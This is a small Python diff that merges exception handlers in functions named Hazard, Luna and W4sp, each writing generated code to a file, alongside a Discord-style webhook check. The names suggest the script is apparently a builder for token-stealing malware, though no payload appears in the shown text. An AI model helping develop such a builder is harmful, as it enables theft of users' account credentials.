@@ -69,9 +69,7 @@ def Hazard():
             f.write(code)
         input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")
 
-    except KeyboardInterrupt:
-        Hazard()
-    except EOFError:
+    except (KeyboardInterrupt, EOFError):
         Hazard()
         
 def Luna():
@@ -86,9 +84,7 @@ def Luna():
             f.write(code)
         input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")
 
-    except KeyboardInterrupt:
-        Luna()
-    except EOFError:
+    except (KeyboardInterrupt, EOFError):
         Luna()
 
 def W4sp():
@@ -103,11 +99,8 @@ def W4sp():
             f.write(code)
         input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")
 
-    except KeyboardInterrupt:
+    except (KeyboardInterrupt, EOFError):
         W4sp()
-    except EOFError:
-        W4sp()
-
 
 def check_webhook(hook):
     msg = '"Unknown Webhook"'
